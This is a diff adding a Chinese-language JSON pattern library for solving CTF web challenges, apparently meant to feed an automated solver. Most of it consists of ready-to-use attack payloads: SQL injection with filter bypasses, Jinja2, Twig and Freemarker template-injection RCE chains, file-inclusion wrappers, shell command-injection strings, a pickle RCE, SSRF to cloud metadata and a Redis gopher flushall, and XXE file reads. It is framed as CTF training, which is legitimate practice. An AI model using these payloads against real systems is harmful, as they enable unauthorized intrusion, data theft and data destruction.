@@ -1,0 +1,242 @@
+{
+  "category": "web",
+  "description": "Web题型常见解题模式与经验库",
+  "patterns": [
+    {
+      "id": "web-sqli-basic",
+      "name": "SQL注入 - 基础检测与利用",
+      "difficulty": "easy",
+      "indicators": ["输入框", "搜索功能", "登录页面", "参数传递", "数据库错误信息"],
+      "methodology": [
+        "1. 识别注入点：在URL参数、POST数据、Cookie、HTTP头中寻找用户可控输入",
+        "2. 测试注入：使用单引号(')、双引号(\")、注释符(--)、OR 1=1等探测",
+        "3. 确认注入类型：联合注入(UNION)、布尔盲注、时间盲注、报错注入",
+        "4. 提取数据：获取数据库名→表名→列名→数据",
+        "5. 读取Flag：通常在flag表或通过LOAD_FILE('/flag')读取文件"
+      ],
+      "tools": ["sqlmap", "手动注入"],
+      "payloads": [
+        "' OR '1'='1",
+        "' UNION SELECT 1,2,3--",
+        "' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--",
+        "' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='flag'--",
+        "' UNION SELECT LOAD_FILE('/flag')--",
+        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT flag FROM flag LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+      ],
+      "common_flag_locations": [
+        "SELECT flag FROM flag",
+        "SELECT flag FROM ctf_flag",
+        "LOAD_FILE('/flag')",
+        "LOAD_FILE('/flag.txt')",
+        "LOAD_FILE('/home/ctf/flag')"
+      ],
+      "bypass_techniques": [
+        "大小写绕过: SeLeCt, UnIoN",
+        "双写绕过: selselectect, ununionion",
+        "编码绕过: URL编码、十六进制编码",
+        "注释绕过: /**/、/*!*/、#",
+        "空格绕过: %09, %0a, %0b, %0c, %0d, /**/",
+        "等号绕过: LIKE, REGEXP, IN, BETWEEN"
+      ]
+    },
+    {
+      "id": "web-ssti",
+      "name": "服务端模板注入 (SSTI)",
+      "difficulty": "medium",
+      "indicators": ["模板渲染", "用户输入被渲染到页面", "Jinja2", "Twig", "Freemarker", "Velocity"],
+      "methodology": [
+        "1. 检测模板引擎：输入 {{7*7}} 或 ${7*7} 观察是否返回49",
+        "2. 识别模板引擎类型：根据不同payload的响应判断",
+        "3. 构造RCE payload：利用模板引擎的内置对象链",
+        "4. 执行命令读取flag"
+      ],
+      "tools": ["tplmap", "手动测试"],
+      "payloads": {
+        "detection": [
+          "{{7*7}}",
+          "${7*7}",
+          "#{7*7}",
+          "<%= 7*7 %>",
+          "{{7*'7'}}",
+          "${\"freemarker\".class.protectionDomain.codeSource.location}"
+        ],
+        "jinja2_rce": [
+          "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}",
+          "{{''.__class__.__mro__[1].__subclasses__()}}",
+          "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('cat /flag').read()\") }}{% endif %}{% endfor %}",
+          "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}",
+          "{{lipsum.__globals__['os'].popen('cat /flag').read()}}"
+        ],
+        "twig_rce": [
+          "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /flag')}}",
+          "{{['cat /flag']|filter('system')}}"
+        ],
+        "freemarker_rce": [
+          "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"cat /flag\")}",
+          "${\"freemarker.template.utility.Execute\"?new()(\"cat /flag\")}"
+        ]
+      }
+    },
+    {
+      "id": "web-lfi-rfi",
+      "name": "本地/远程文件包含 (LFI/RFI)",
+      "difficulty": "medium",
+      "indicators": ["文件参数", "page=", "file=", "include=", "path=", "PHP应用"],
+      "methodology": [
+        "1. 识别文件包含参数：URL中的file、page、path、include等参数",
+        "2. 测试路径穿越：使用../尝试读取/etc/passwd",
+        "3. 读取源码：使用php://filter读取PHP源码",
+        "4. 尝试读取flag文件",
+        "5. 如果可以RFI，尝试包含远程恶意文件"
+      ],
+      "tools": ["手动测试", "LFISuite"],
+      "payloads": [
+        "../../../../etc/passwd",
+        "....//....//....//etc/passwd",
+        "php://filter/read=convert.base64-encode/resource=index.php",
+        "php://filter/convert.base64-encode/resource=flag",
+        "php://filter/convert.base64-encode/resource=flag.php",
+        "php://input (POST: <?php system('cat /flag'); ?>)",
+        "data://text/plain,<?php system('cat /flag'); ?>",
+        "data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTsgPz4=",
+        "/proc/self/environ",
+        "/flag",
+        "/flag.txt",
+        "/home/ctf/flag.txt"
+      ],
+      "bypass_techniques": [
+        "双写绕过: ....//....//",
+        "编码绕过: %2e%2e%2f, %252e%252e%252f",
+        "截断绕过: %00 (PHP < 5.3.4)",
+        "路径规范化: /var/www/html/../../../flag"
+      ]
+    },
+    {
+      "id": "web-command-injection",
+      "name": "命令注入",
+      "difficulty": "easy",
+      "indicators": ["ping功能", "系统命令执行", "exec", "system", "shell_exec"],
+      "methodology": [
+        "1. 识别命令注入点：通常在执行系统命令的功能处",
+        "2. 测试命令分隔符：;、|、||、&&、`、$()等",
+        "3. 执行命令读取flag"
+      ],
+      "payloads": [
+        ";cat /flag",
+        "|cat /flag",
+        "||cat /flag",
+        "&&cat /flag",
+        "`cat /flag`",
+        "$(cat /flag)",
+        ";cat${IFS}/flag",
+        ";cat$IFS/flag",
+        ";{cat,/flag}",
+        ";cat</flag"
+      ],
+      "bypass_techniques": [
+        "空格绕过: ${IFS}, $IFS, {cmd,arg}, <, %09",
+        "关键字绕过: ca''t, ca\"\"t, c\\at, /bin/ca?",
+        "编码绕过: base64编码后eval",
+        "变量拼接: a=ca;b=t;$a$b /flag",
+        "通配符: /???/??t /fl?g"
+      ]
+    },
+    {
+      "id": "web-deserialization",
+      "name": "反序列化漏洞",
+      "difficulty": "hard",
+      "indicators": ["serialize", "unserialize", "pickle", "ObjectInputStream", "cookie中的序列化数据"],
+      "methodology": [
+        "1. 识别反序列化入口：Cookie、POST参数、文件上传",
+        "2. 分析可用的类和方法（POP链构造）",
+        "3. 构造恶意序列化数据",
+        "4. 触发反序列化执行命令"
+      ],
+      "payloads": {
+        "php": [
+          "O:4:\"Test\":1:{s:4:\"cmd\";s:9:\"cat /flag\";}",
+          "利用__destruct、__wakeup、__toString等魔术方法"
+        ],
+        "python_pickle": [
+          "import pickle, os; pickle.loads(b\"cos\\nsystem\\n(S'cat /flag'\\ntR.\")",
+          "__reduce__方法构造RCE"
+        ],
+        "java": [
+          "使用ysoserial生成payload",
+          "CommonsBeanutils、CommonsCollections链"
+        ]
+      }
+    },
+    {
+      "id": "web-ssrf",
+      "name": "服务端请求伪造 (SSRF)",
+      "difficulty": "medium",
+      "indicators": ["URL参数", "图片加载", "webhook", "导入功能", "PDF生成"],
+      "methodology": [
+        "1. 识别SSRF入口：URL参数、文件导入、图片URL等",
+        "2. 测试内网访问：尝试访问127.0.0.1、内网IP",
+        "3. 读取本地文件：file:///flag",
+        "4. 访问云元数据：http://169.254.169.254/"
+      ],
+      "payloads": [
+        "file:///flag",
+        "file:///flag.txt",
+        "http://127.0.0.1/flag",
+        "http://0.0.0.0/flag",
+        "http://[::1]/flag",
+        "http://169.254.169.254/latest/meta-data/",
+        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
+        "dict://127.0.0.1:6379/info"
+      ]
+    },
+    {
+      "id": "web-xxe",
+      "name": "XML外部实体注入 (XXE)",
+      "difficulty": "medium",
+      "indicators": ["XML解析", "SOAP", "SVG上传", "Office文件处理"],
+      "methodology": [
+        "1. 识别XML解析入口",
+        "2. 构造外部实体读取文件",
+        "3. 如果无回显，使用OOB外带数据"
+      ],
+      "payloads": [
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///flag\">]><root>&xxe;</root>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/flag\">]><root>&xxe;</root>"
+      ]
+    },
+    {
+      "id": "web-race-condition",
+      "name": "竞态条件",
+      "difficulty": "hard",
+      "indicators": ["余额操作", "优惠券", "文件上传后检查", "先写后删"],
+      "methodology": [
+        "1. 识别存在时间窗口的操作",
+        "2. 使用多线程/多进程并发请求",
+        "3. 利用TOCTOU(检查时间/使用时间)漏洞"
+      ],
+      "tools": ["turbo-intruder (Burp Suite)", "Python threading/asyncio"],
+      "payloads": [
+        "import threading; [threading.Thread(target=send_request).start() for _ in range(50)]",
+        "async with aiohttp.ClientSession() as s: await asyncio.gather(*[s.get(url) for _ in range(100)])"
+      ]
+    },
+    {
+      "id": "web-jwt",
+      "name": "JWT攻击",
+      "difficulty": "medium",
+      "indicators": ["JWT token", "Authorization: Bearer", "eyJ开头的字符串"],
+      "methodology": [
+        "1. 解码JWT查看header和payload",
+        "2. 尝试alg:none攻击",
+        "3. 尝试弱密钥爆破",
+        "4. 尝试RS256→HS256算法混淆"
+      ],
+      "payloads": [
+        "修改alg为none，删除签名",
+        "使用公钥作为HS256密钥签名",
+        "修改payload中的role/admin字段"
+      ],
+      "tools": ["jwt_tool", "jwt.io", "hashcat"]
+    }
+  ]
+}
